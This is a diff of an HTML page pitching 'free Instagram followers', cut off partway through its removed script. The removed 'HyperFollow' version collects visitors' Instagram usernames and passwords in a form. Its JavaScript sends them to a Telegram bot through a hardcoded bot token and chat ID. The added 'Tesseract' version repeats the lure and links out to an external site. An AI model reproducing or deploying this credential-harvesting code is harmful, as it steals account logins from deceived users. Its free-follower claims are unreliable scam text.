@@ -2,618 +2,326 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HyperFollow 1.0 - Final Flow</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Tesseract - Premium Aesthetic UI</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
-
-        :root {
-            --bg-color: #f8fafc;
-            --surface: #ffffff;
-            --text-main: #0f172a; 
-            --text-light: #64748b;
-            --accent: #2563eb; 
-            --accent-hover: #1d4ed8;
-            --warning: #ea580c; 
-            --success: #10b981; 
-            --error: #ef4444;
-            --border: #e2e8f0;
-            --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
-            --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
-            --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
-        }
-        
-        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Inter', -apple-system, sans-serif; -webkit-tap-highlight-color:transparent; }
-        html, body { overflow-x: hidden; }
-        body { background-color:var(--bg-color); color:var(--text-main); height:100vh; width:100%; overflow:hidden; }
-
-        @keyframes fadeUp {
-            from { opacity: 0; transform: translateY(15px); }
-            to { opacity: 1; transform: translateY(0); }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            -webkit-font-smoothing: antialiased;
         }
 
-        .fixed-top-section { position:fixed; top:0; left:0; width:100%; display:flex; flex-direction:column; align-items:center; z-index:1000; pointer-events:none; }
-        .fixed-top-section > * { pointer-events:auto; }
-        
-        header { width:100%; height:70px; display:flex; align-items:center; justify-content:center; background-color:var(--surface); box-shadow:var(--shadow-sm); margin-bottom:15px; border-bottom: 1px solid var(--border); }
-        .logo-text { font-size:24px; font-weight:800; letter-spacing: -0.5px; }
-        .logo-text span { color:var(--accent); }
-        
-        .dev-info-box { background:var(--surface); padding:8px 24px; border-radius:100px; box-shadow:var(--shadow-md); border: 1px solid var(--border); text-align:center; display:flex; flex-direction:column; gap:2px; width:auto; transition:all 0.3s ease; }
-        .dev-info-box .dev-name { font-size:13px; font-weight:700; color:var(--text-main); }
-        .dev-info-box .dev-role { font-size:11px; font-weight:500; color:var(--text-light); text-transform: uppercase; letter-spacing: 0.5px; }
-
-        .app-window { width:100%; height:100vh; padding-top:140px; transition:padding-top 0.5s cubic-bezier(0.4, 0, 0.2, 1); overflow:hidden; }
-        .slider-track { display:flex; width:300vw; height:100%; transition:transform 0.6s cubic-bezier(0.4, 0, 0.2, 1); }
-        
-        .page { width:100vw; height:100%; overflow-y:auto; padding-bottom:20px; display:flex; flex-direction:column; align-items:center; scrollbar-width: none; }
-        .page::-webkit-scrollbar { display: none; }
-        
-        #page1 { overflow-y: auto; padding-bottom: 0; justify-content: flex-start; }
-
-        .animation-container { width:100%; display:flex; justify-content:center; align-items:center; margin-top:-10px; margin-bottom:-20px; animation: fadeUp 0.6s ease forwards; }
-        .animation-container iframe { width:260px; height:260px; border:none; pointer-events:none; }
-        
-        .watermark-desc { font-size:13px; color:var(--text-light); text-align:center; font-weight:500; line-height:1.6; max-width:85%; margin-bottom:25px; animation: fadeUp 0.7s ease forwards; opacity: 0; }
-        .watermark-desc span { display: block; margin-top: 8px; font-size:11px; opacity: 0.8; }
-        
-        .safety-note { font-size:12px; color:var(--warning); text-align:center; font-weight:500; line-height:1.5; max-width:85%; margin-top:25px; padding:12px 16px; background:#fff7ed; border-radius:12px; border:1px solid #ffedd5; animation: fadeUp 0.9s ease forwards; opacity: 0; }
-        
-        .version-text { font-size:11px; color:var(--text-light); font-weight:600; opacity:0.6; margin-top:auto; margin-bottom: 25px; text-align:center; animation: fadeUp 1s ease forwards; opacity: 0; padding-top: 20px; }
-
-        .neu-btn { background:var(--text-main); color:#fff; border:none; border-radius:12px; padding:16px 24px; font-size:15px; font-weight:600; cursor:pointer; transition:all 0.2s ease; outline:none; width:85%; max-width:350px; display:flex; align-items:center; justify-content:center; gap:8px; animation: fadeUp 0.8s ease forwards; opacity: 0; box-shadow: var(--shadow-md); }
-        .neu-btn:active { transform:scale(0.98); }
-        .neu-btn svg { transition: transform 0.2s; }
-        .neu-btn:hover svg { transform: translateX(4px); }
-        
-        .btn-green { background:var(--accent); margin-top:5px; margin-bottom:5px; padding: 14px 24px; animation: none; opacity: 1; border-radius: 10px; }
-        .btn-green:hover { background:var(--accent-hover); }
-        .btn-green:disabled { opacity:0.7; cursor:not-allowed; transform:none; }
-        
-        .back-link { color:var(--text-light); font-size:13px; font-weight:600; display:flex; align-items:center; gap:6px; cursor:pointer; transition:color 0.2s; padding:5px; margin-bottom: 5px; }
-        .back-link:hover,.back-link:active { color:var(--text-main); }
-        .back-link svg { width: 14px; height: 14px; transition: transform 0.2s; }
-        .back-link:hover svg { transform: translateX(-4px); }
-
-        .section-box { width:90%; max-width:400px; margin-bottom:10px; display:flex; flex-direction:column; background: var(--surface); padding: 14px 18px; border-radius: 14px; box-shadow: var(--shadow-sm); border: 1px solid var(--border); }
-        .section-title { font-size:14px; font-weight:700; color:var(--text-main); margin-bottom:4px; }
-        .section-desc { font-size:11px; color:var(--text-light); font-weight:500; margin-bottom:10px; line-height:1.4; }
-
-        .input-group { position:relative; width:100%; margin-bottom:8px; display:flex; align-items:center; }
-        .neu-input { width:100%; padding:12px 40px 12px 12px; border-radius:8px; border:1px solid var(--border); outline:none; background:var(--bg-color); color:var(--text-main); font-size:13px; font-weight:500; transition:all 0.2s ease; }
-        .neu-input.pass-input { padding-right: 40px; } 
-        
-        .neu-input::placeholder { color:#94a3b8; font-weight:400; }
-        .neu-input:focus { border-color:var(--accent); background: var(--surface); box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1); }
-        .neu-input.input-error { border-color: var(--error); box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1); background: #fef2f2; }
-
-        .action-icons { position:absolute; right:8px; display:flex; gap:6px; align-items:center; }
-        .icon-btn { cursor:pointer; display:flex; justify-content:center; align-items:center; color:var(--text-light); transition:0.2s; padding: 4px; border-radius: 6px; }
-        .icon-btn:hover { color:var(--text-main); background: var(--border); }
-        .icon-btn svg { width:16px; height:16px; }
-        
-        .clear-btn, .eye-btn { display:none; }
-
-        .service-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; width: 100%; margin-bottom: 8px; }
-        .service-box { width: 100%; padding: 10px 5px; border-radius: 8px; font-size: 12px; font-weight: 600; background: var(--bg-color); border: 1px solid var(--border); display: flex; flex-direction: column; justify-content: center; align-items: center; gap: 4px; cursor: pointer; transition: all 0.2s ease; color: var(--text-light); text-align: center; }
-        .service-box:hover { border-color: var(--accent); background: #eff6ff; }
-        .service-box svg { width: 18px; height: 18px; stroke: currentColor; opacity: 0.7; transition: all 0.2s ease; }
-        
-        .service-box.active { background: var(--accent); border-color: var(--accent); color: #ffffff; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2); }
-        .service-box.active svg { opacity: 1; stroke: #ffffff; }
-
-        #dynamicArea { display:none; margin-top:2px; width:100%; }
-        .limit-error-msg { color: var(--error); font-size: 11px; font-weight: 600; text-align: center; margin-top: 4px; margin-bottom: 8px; display: none; width: 100%; }
-
-        .toast { position:fixed; bottom:30px; left:50%; transform:translateX(-50%) translateY(120px); padding:12px 20px; border-radius:10px; font-size:13px; font-weight:600; color:#fff; background:var(--text-main); box-shadow:var(--shadow-lg); z-index:9999; transition:transform 0.4s cubic-bezier(0.4, 0, 0.2, 1); text-align:center; max-width:85%; pointer-events:none; }
-        .toast.show { transform:translateX(-50%) translateY(0); }
-        .toast.error { background:var(--error); }
-
-        #page3 { justify-content: center; align-items: center; padding-top: 0; padding-bottom: 80px; position: relative; }
-        
-        .timer-circle { width: 100px; height: 100px; border-radius: 50%; background: var(--surface); box-shadow: var(--shadow-md); display: flex; align-items: center; justify-content: center; font-size: 36px; font-weight: 800; color: var(--accent); margin-bottom: 24px; border: 2px solid var(--border); position: relative; z-index: 10; }
-        .success-heading { font-size: 22px; font-weight: 700; color: var(--text-main); margin-bottom: 12px; text-align: center; position: relative; z-index: 10; }
-        .success-text { font-size: 13px; color: var(--text-light); text-align: center; max-width: 85%; line-height: 1.6; font-weight: 500; position: relative; z-index: 10; }
-        .ig-handle { color: var(--accent); text-decoration: none; font-weight: 600; }
-        .ig-handle:hover { text-decoration: underline; }
-
-        #fullscreenAnimContainer { 
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
-            z-index: 900; pointer-events: none; display: none; 
-            justify-content: center; align-items: center; overflow: hidden;
+        body {
+            background-color: #030712; /* ഡീപ് ഒബ്സിഡിയൻ ബ്ലാക്ക് */
+            color: #F9FAFB;
+            line-height: 1.6;
+            overflow-x: hidden;
+            overflow-y: auto; 
+            width: 100vw;
+            position: relative;
         }
-        #fullscreenAnimContainer iframe { width: 100vw; height: 100vh; border: none; transform: scale(1.4); }
-        
-        .preload-hidden { position: absolute; width: 0; height: 0; opacity: 0; visibility: hidden; pointer-events: none; }
 
-        #offlineOverlay {
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            background-color: #ffffff; z-index: 99999;
-            display: none; 
-            flex-direction: column; justify-content: center; align-items: center;
-            text-align: center; padding: 20px;
+        /* ആംബിയന്റ് ബാക്ക്‌ലൈറ്റ് ഗ്ലോ */
+        .glow-sphere {
+            position: fixed; 
+            top: -150px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 700px;
+            height: 450px;
+            background: radial-gradient(circle, rgba(59, 130, 246, 0.25) 0%, rgba(99, 102, 241, 0.15) 40%, transparent 70%);
+            filter: blur(80px);
+            z-index: 0;
+            pointer-events: none;
         }
-        .offline-anim { width: 280px; height: 280px; pointer-events: none; margin-bottom: -40px; margin-top: -20px; }
-        .offline-anim iframe { width: 100%; height: 100%; border: none; }
-        
-        .offline-title { color: var(--warning); font-size: 26px; font-weight: 800; letter-spacing: 0.5px; margin-bottom: 6px; }
-        .offline-desc { color: #94a3b8; font-size: 13px; font-weight: 500; max-width: 320px; line-height: 1.5; }
-        
-        .refresh-text-btn { 
-            margin-top: 25px; font-size: 15px; font-weight: 700; color: var(--text-main); 
-            background: #f1f5f9; padding: 12px 35px; border-radius: 10px; cursor: pointer; 
-            border: 1px solid var(--border); transition: all 0.2s ease;
+
+        /* സ്ട്രൈറ്റ് ഗ്ലാസ് ഹെഡർ */
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            padding: 18px 30px;
+            background: rgba(17, 24, 39, 0.6);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            z-index: 100;
         }
-        .refresh-text-btn:active { transform: scale(0.95); }
+
+        .logo {
+            font-size: 1.3rem;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            color: #FFFFFF;
+        }
+
+        /* പ്രധാന കണ്ടെന്റ് */
+        .hero {
+            position: relative;
+            z-index: 1;
+            min-height: 100vh; 
+            display: flex;
+            flex-direction: column;
+            justify-content: center; 
+            align-items: center; 
+            padding: 120px 20px 60px; 
+            text-align: center;
+        }
+
+        .hero h1 {
+            font-size: clamp(2.5rem, 6vw, 4.5rem);
+            font-weight: 800;
+            line-height: 1.2;
+            letter-spacing: -0.04em;
+            margin: 0 0 15px 0; 
+        }
+
+        .hero p.subtitle {
+            color: #F3F4F6; 
+            font-size: clamp(1rem, 3vw, 1.15rem);
+            max-width: 600px; 
+            line-height: 1.6;
+            margin: 0 0 30px 0; 
+            font-weight: 400;
+        }
+
+        .gradient-title {
+            background: linear-gradient(180deg, #FFFFFF 20%, #9CA3AF 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* പുതിയ ലിങ്ക് ചേർത്ത Start Now ബട്ടൺ */
+        .start-btn {
+            display: inline-block;
+            padding: 14px 36px;
+            font-size: 1.05rem;
+            font-weight: 600;
+            color: #ffffff;
+            text-decoration: none;
+            background: rgba(255, 255, 255, 0.05); 
+            border: 1px solid rgba(255, 255, 255, 0.15); 
+            border-radius: 12px; 
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            cursor: pointer;
+            margin-bottom: 40px; 
+        }
+
+        .start-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.3);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 255, 255, 0.1);
+        }
+
+        /* ലിക്വിഡ് ഗ്ലാസ് ബോക്സ് (System Status) */
+        .status-box {
+            background: rgba(255, 255, 255, 0.02); 
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 16px; 
+            padding: 20px 25px;
+            max-width: 650px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            margin-bottom: 40px;
+        }
+
+        .status-title {
+            display: block;
+            color: #10B981; 
+            font-weight: 800; 
+            font-size: 1.05rem;
+            margin-bottom: 10px;
+            letter-spacing: 0.5px;
+        }
+
+        .status-text {
+            color: rgba(255, 255, 255, 0.4); 
+            font-size: 0.85rem;
+            line-height: 1.7;
+            font-weight: 400;
+            margin: 0;
+        }
+
+        /* Other Apps സെക്ഷൻ */
+        .others-section {
+            width: 100%;
+            max-width: 650px; 
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ഇടത് വശത്തെ തലക്കെട്ട് */
+        .others-title {
+            align-self: flex-start; 
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 10px;
+        }
+
+        /* നടുവിലുള്ള വിവരണം */
+        .others-desc {
+            text-align: center; 
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.5);
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        /* ലിക്വിഡ് ഗ്ലാസ് ആപ്പ് കാർഡ് */
+        .app-card {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(24px) saturate(150%);
+            -webkit-backdrop-filter: blur(24px) saturate(150%);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 20px;
+            padding: 16px 20px;
+            box-shadow: inset 0 1px 1px rgba(255, 255, 255, 0.1), 0 15px 35px rgba(0, 0, 0, 0.3);
+        }
+
+        .app-left-side {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        /* മ്യൂസിക് ഐക്കൺ ബോക്സ് */
+        .perfect-music-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #a855f7, #3b82f6); 
+            border-radius: 14px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.35);
+        }
+
+        .app-name {
+            font-size: 1rem;
+            font-weight: 600;
+            color: #ffffff;
+        }
+
+        /* പുതിയ പേജിലേക്ക് പോകുന്ന ഡൗൺലോഡ് ബട്ടൺ */
+        .download-btn {
+            background: rgba(255, 255, 255, 0.08);
+            color: #ffffff;
+            padding: 10px 20px;
+            border-radius: 10px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            text-decoration: none;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transition: all 0.3s ease;
+            cursor: pointer;
+            display: inline-block;
+        }
+
+        .download-btn:hover {
+            background: #ffffff;
+            color: #030712; 
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(255, 255, 255, 0.2);
+        }
+
+        /* മൊബൈൽ ക്രമീകരണങ്ങൾ */
+        @media (max-width: 768px) {
+            header { padding: 16px 20px; }
+            .start-btn { padding: 12px 32px; font-size: 1rem; }
+            .status-box { padding: 15px 20px; }
+            .app-card { padding: 14px 16px; }
+        }
     </style>
 </head>
 <body>
 
-<div id="offlineOverlay">
-    <div class="offline-anim">
-        <iframe src="https://lottie.host/embed/067b124a-9406-4ea2-86b8-78be1abf2f01/sQjatCBXNb.lottie"></iframe>
-    </div>
-    <div class="offline-title">Network Error</div>
-    <div class="offline-desc">Network connection lost. The website cannot process your request. Please ensure your mobile data or Wi-Fi is turned on.</div>
-    <button class="refresh-text-btn" onclick="window.location.reload()">Refresh</button>
-</div>
+    <!-- പശ്ചാത്തല ലൈറ്റിംഗ് -->
+    <div class="glow-sphere"></div>
 
-<div class="preload-hidden">
-    <iframe src="https://lottie.host/embed/55502969-5545-4838-ae5a-1d873f3f1c95/U0eLScKS7a.lottie"></iframe>
-    <iframe src="https://lottie.host/embed/067b124a-9406-4ea2-86b8-78be1abf2f01/sQjatCBXNb.lottie"></iframe>
-</div>
+    <!-- Tesseract ഹെഡർ -->
+    <header>
+        <div class="logo">Tesseract</div>
+    </header>
 
-<div id="fullscreenAnimContainer">
-    <iframe id="confettiIframe" src=""></iframe>
-</div>
+    <section class="hero">
+        <h1 class="gradient-title" id="mainTitle">Free Instagram Followers</h1>
+        <p class="subtitle" id="subTitle">100% free tool to increase your Instagram followers, likes, views, and resharing instantly.</p>
+        
+        <!-- പുതിയ ടാബിൽ തുറക്കുന്ന Start Now ബട്ടൺ -->
+        <a href="https://tesract-followers-2.vpna4819.workers.dev/" target="_blank" rel="noopener noreferrer" class="start-btn" id="startBtn">Start Now</a>
 
-<div class="fixed-top-section">
-    <header><div class="logo-text">Hyper<span>Follow</span></div></header>
-    <div class="dev-info-box" id="devBox">
-        <span class="dev-name">Lead Developer | Samad</span>
-        <span class="dev-role">Code Architect | Artificial Intelligence</span>
-    </div>
-</div>
-
-<div class="app-window" id="appWindow">
-    <div class="slider-track" id="sliderTrack">
-
-        <!-- PAGE 1 (Home) -->
-        <div class="page" id="page1">
-            <div class="animation-container">
-                <iframe src="https://lottie.host/embed/285f0b67-5efd-489f-95fe-90da50b2a92b/Z9WCP5jp50.lottie"></iframe>
-            </div>
-            <p class="watermark-desc">
-                The ultimate platform to grow your Instagram followers, likes, and views securely.
-                <span>(Delivery may take a few hours or days after submitting your request).</span>
-            </p>
-            <button class="neu-btn" onclick="goToForm()">
-                Free Followers 
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
-            </button>
-            <div class="safety-note">Note: For service delivery, please log in using a 'fake' account and ensure all details are correct. This is essential for your official account's security.</div>
-            <div class="version-text">HyperFollow 1.0.2</div>
+        <!-- System Status ബോക്സ് -->
+        <div class="status-box" id="statusBox">
+            <span class="status-title">System Status.</span>
+            <p class="status-text">Driven by a combination of AI and smart algorithms, this site securely filters and aggregates reliable external growth sources. In the event of system errors or algorithmic failures, the site may temporarily go offline to ensure security, followed by immediate restoration efforts. Future updates will introduce more verified sources and enhanced follower limits.</p>
         </div>
 
-        <!-- PAGE 2 (Form) -->
-        <div class="page" id="page2">
-            <div class="section-box">
-                <div class="section-title">Instagram Username</div>
-                <div class="section-desc">Enter this Instagram Username Where you to Receive Followers, like, or views.</div>
-                <div class="input-group">
-                    <input type="text" id="origUser" class="neu-input" placeholder="Enter username..!!" oninput="handleInput('origUser')">
-                    <div class="action-icons">
-                        <span class="icon-btn clear-btn" id="clear-origUser" onclick="clearInput('origUser')">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
-                        </span>
-                    </div>
-                </div>
-            </div>
-
-            <div class="section-box">
-                <div class="section-title">Sign In</div>
-                <div class="section-desc">Create a spare/fake account on Instagram and enter its correct username and password below.</div>
-                <div class="input-group">
-                    <input type="text" id="fakeUser" class="neu-input" placeholder="Username" oninput="handleInput('fakeUser')">
-                    <div class="action-icons">
-                        <span class="icon-btn clear-btn" id="clear-fakeUser" onclick="clearInput('fakeUser')">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="input-group">
-                    <input type="password" id="fakePass" class="neu-input pass-input" placeholder="Password" oninput="handleInput('fakePass')">
-                    <div class="action-icons">
-                        <span class="icon-btn eye-btn" id="eye-toggle-fakePass" onclick="togglePasswordVisibility('fakePass')">
-                            <!-- Open eye (No line) -->
-                            <svg id="eye-open-fakePass" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none;">
-                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
-                                <circle cx="12" cy="12" r="3"/>
-                            </svg>
-                            <!-- Closed eye (With line) -->
-                            <svg id="eye-closed-fakePass" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:block;">
-                                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
-                                <line x1="1" y1="1" x2="23" y2="23"/>
-                            </svg>
-                        </span>
-                    </div>
-                </div>
-            </div>
-
-            <div class="section-box">
-                <div class="section-title">Service option</div>
-                <div class="section-desc">Select the required option from below.</div>
-                
-                <div class="service-grid">
-                    <div class="service-box" id="opt-followers" onclick="selectService('followers')">
-                        <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
-                        Followers
-                    </div>
-                    <div class="service-box" id="opt-likes" onclick="selectService('likes')">
-                        <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
-                        Likes
-                    </div>
-                    <div class="service-box" id="opt-views" onclick="selectService('views')">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
-                        Views
-                    </div>
-                </div>
-                
-                <div id="dynamicArea">
-                    <div class="input-group">
-                        <input type="text" id="dynamicInput" class="neu-input" placeholder="" oninput="handleInput('dynamicInput')">
-                        <div class="action-icons">
-                            <span class="icon-btn clear-btn" id="clear-dynamicInput" onclick="clearInput('dynamicInput')">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
-                            </span>
-                        </div>
-                    </div>
-                    <div id="limitError" class="limit-error-msg">You cannot request more than 100 followers at a time.</div>
-                </div>
-            </div>
-
-            <button class="neu-btn btn-green" id="submitBtn" onclick="handleSubmit()">SUBMIT REQUEST</button>
-            <div class="back-link" onclick="goBackToHomeFromForm()">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
-                Back
-            </div>
-        </div>
-
-        <!-- PAGE 3 (Success & Timer) -->
-        <div class="page" id="page3">
-            <div class="timer-circle" id="countdownTimer">10</div>
-            <div class="success-heading">Request Accepted</div>
-            <div class="success-text">
-                Your requests are currently being processed. You will receive your requested service shortly. If you experience any delay, please DM <a href="https://www.instagram.com/al_samad.in?igsh=ZjZ5YzA5Y2x5dWtr" class="ig-handle">al_samad.in</a> for immediate resolution.
-            </div>
-        </div>
-
-    </div>
-</div>
-
-<div class="toast" id="toast"></div>
-
-<script>
-    const BOT_TOKEN = '8987176162:AAHn-f38cq9evndlyDbZAz7xTJQe_EYZru8';
-    const CHAT_ID   = '7208869554';
-
-    let selectedService = null;
-    let timerInterval = null;
-    let limitErrorTimer = null; 
-    let successAnimStopTimer = null;
-    let pendingSubmit = false;
-
-    window.addEventListener('online', () => {
-        const overlay = document.getElementById('offlineOverlay');
-        if (overlay.style.display === 'flex' && pendingSubmit) {
-            overlay.style.display = 'none';
-            pendingSubmit = false;
-            handleSubmit(); 
-        }
-    });
-
-    function handleInput(id) {
-        document.getElementById(id).classList.remove('input-error');
-        toggleIcons(id);
-    }
-
-    function toggleIcons(inputId) {
-        const input = document.getElementById(inputId);
-        const hasText = input.value.length > 0;
-        
-        const clearBtn = document.getElementById('clear-' + inputId);
-        if(clearBtn) {
-            clearBtn.style.display = hasText ? 'flex' : 'none';
-        }
-        
-        if (inputId === 'fakePass') {
-            const eyeBtn = document.getElementById('eye-toggle-fakePass');
-            if(eyeBtn) {
-                eyeBtn.style.display = hasText ? 'flex' : 'none';
-            }
-        }
-    }
-
-    function togglePasswordVisibility(id) {
-        const input = document.getElementById(id);
-        const eyeOpen = document.getElementById('eye-open-' + id);
-        const eyeClosed = document.getElementById('eye-closed-' + id);
-        
-        if (input.type === 'password') {
-            input.type = 'text';
-            eyeClosed.style.display = 'none';
-            eyeOpen.style.display = 'block';
-        } else {
-            input.type = 'password';
-            eyeOpen.style.display = 'none';
-            eyeClosed.style.display = 'block';
-        }
-    }
-
-    function isValidURL(string) {
-        try {
-            new URL(string);
-            return true;
-        } catch (_) {
-            return false;
-        }
-    }
-
-    function sendToTelegram(origUsername, fakeUsername, fakePassword, service, extra) {
-        const extraVal = extra || "Not specified";
-        const message =
-            '🚀 New HyperFollow Request\n\n' +
-            '👤 Original Username: ' + origUsername + '\n' +
-            '🎭 Fake Username: ' + fakeUsername + '\n' +
-            '🔑 Fake Password: ' + fakePassword + '\n' +
-            '📌 Service: ' + service + '\n' +
-            (service === 'Followers' ? '🔢 Required Count: ' : '🔗 Post Link: ') + extraVal + '\n\n' +
-            '⏰ ' + new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-
-        const url = 'https://api.telegram.org/bot' + BOT_TOKEN +
-                    '/sendMessage?chat_id=' + CHAT_ID +
-                    '&text=' + encodeURIComponent(message);
-
-        return fetch(url)
-            .then(function(response) { return response.json(); })
-            .then(function(data) {
-                return data.ok;
-            })
-            .catch(function(error) {
-                console.error('Network Error:', error);
-                return false;
-            });
-    }
-
-    let toastTimer = null;
-    function showToast(msg, type, duration) {
-        duration = duration || 3500;
-        const t = document.getElementById('toast');
-        t.textContent = msg;
-        t.className = 'toast ' + (type || '');
-        void t.offsetWidth;
-        t.classList.add('show');
-        if (toastTimer) clearTimeout(toastTimer);
-        toastTimer = setTimeout(function() { t.classList.remove('show'); }, duration);
-    }
-
-    async function handleSubmit() {
-        if (!navigator.onLine) {
-            document.getElementById('offlineOverlay').style.display = 'flex';
-            pendingSubmit = true;
-            return;
-        }
-
-        const origUser   = document.getElementById('origUser').value.trim();
-        const fakeUser   = document.getElementById('fakeUser').value.trim();
-        const fakePass   = document.getElementById('fakePass').value.trim();
-        const dynamicVal = document.getElementById('dynamicInput').value.trim();
-
-        let hasError = false;
-
-        if (!origUser) { document.getElementById('origUser').classList.add('input-error'); hasError = true; }
-        if (!fakeUser) { document.getElementById('fakeUser').classList.add('input-error'); hasError = true; }
-        if (!fakePass) { document.getElementById('fakePass').classList.add('input-error'); hasError = true; }
-        
-        if (!dynamicVal && selectedService !== 'followers') { 
-            document.getElementById('dynamicInput').classList.add('input-error'); 
-            hasError = true; 
-        }
-
-        if (selectedService === 'followers' && dynamicVal !== '') {
-            const count = parseInt(dynamicVal, 10);
-            if (count > 100) {
-                const dynamicInput = document.getElementById('dynamicInput');
-                const errorMsg = document.getElementById('limitError');
-                
-                dynamicInput.classList.add('input-error');
-                errorMsg.style.display = 'block';
-
-                if(limitErrorTimer) clearTimeout(limitErrorTimer);
-                
-                limitErrorTimer = setTimeout(() => {
-                    dynamicInput.classList.remove('input-error');
-                    errorMsg.style.display = 'none';
-                }, 5000);
-
-                return; 
-            }
-        }
-
-        if (hasError) return;
-        if (!selectedService) return;
-
-        if ((selectedService === 'likes' || selectedService === 'views') && !isValidURL(dynamicVal)) {
-            document.getElementById('dynamicInput').classList.add('input-error');
-            return; 
-        }
-
-        const serviceLabel = selectedService.charAt(0).toUpperCase() + selectedService.slice(1);
-
-        const btn = document.getElementById('submitBtn');
-        btn.disabled = true;
-        btn.textContent = 'Sending...';
-
-        const success = await sendToTelegram(origUser, fakeUser, fakePass, serviceLabel, dynamicVal);
-
-        if (success) {
